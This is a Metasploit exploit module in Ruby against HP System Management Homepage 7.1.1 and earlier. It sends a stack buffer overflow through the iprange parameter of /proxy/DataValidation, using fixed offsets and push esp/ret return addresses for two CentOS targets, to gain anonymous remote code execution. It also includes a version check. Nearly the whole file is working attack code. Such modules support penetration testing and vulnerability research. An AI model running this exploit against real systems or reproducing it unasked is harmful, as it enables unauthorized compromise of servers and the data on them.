##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	HttpFingerprint = { :pattern => [ /HP System Management Homepage/ ] }

	include Msf::Exploit::Remote::HttpClient

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'HP System Management Anonymous Access Code Execution',
			'Description'    => %q{
					This module exploits an anonymous remote code execution on HP System Management
				7.1.1 and earlier. The vulnerability exists when handling the iprange parameter on
				a request against /proxy/DataValidation. In order to work HP System Management must
				be configured with Anonymous access enabled.
			},
			'Author'         => [ 'agix' ], # @agixid
			'License'        => MSF_LICENSE,
			'Payload'        =>
				{
					'DisableNops' => true,
					'Space'       => 1000,
					'BadChars' => "\x00\x25\x0a\x0b\x0d\x3a\x3b\x09\x0c\x23\x20",
					'EncoderOptions' =>
						{
							'BufferRegister' => 'ESP' # See the comments below
						}
				},
			'Platform'       => ['linux'],
			'Arch'           => ARCH_X86,
			'References'	 =>
				[
					['OSVDB', '91812']
				],
			'Targets'        =>
				[
					[ 'HP System Management 7.1.1 - Linux (CentOS)',
						{
							'Ret' => 0x8054e14, # push esp / ret
							'Offset' => 267
						}
					],
					[ 'HP System Management 6.3.0 - Linux (CentOS)',
						{
							'Ret' => 0x805a547, # push esp / ret
							'Offset' => 267
						}
					]
				],
			'DisclosureDate' => 'Sep 01 2012',
			'DefaultTarget' => 0))

		register_options(
			[
				Opt::RPORT(2381),
				OptBool.new('SSL', [true, 'Use SSL', true])
			], self.class)

	end

	def check
		res = send_request_cgi({
			'method' => 'GET',
			'uri' => "/cpqlogin.htm"
		})

		if res and res.code == 200 and res.body =~ /"HP System Management Homepage v(.*)"/
			version = $1
			return Exploit::CheckCode::Vulnerable if version <= "7.1.1.1"
		end

		return Exploit::CheckCode::Safe
	end

	def exploit

		padding = rand_text_alpha(target['Offset'])
		ret = [target['Ret']].pack('V')
		iprange = "a-bz"+padding+ret+payload.encoded

		print_status("#{rhost}:#{rport} - Sending exploit...")

		res = send_request_cgi({
			'method' => 'GET',
			'uri' => "/proxy/DataValidation",
			'encode_params' => false,
			'vars_get' => {
				'iprange' => iprange
			}
		})

	end

end

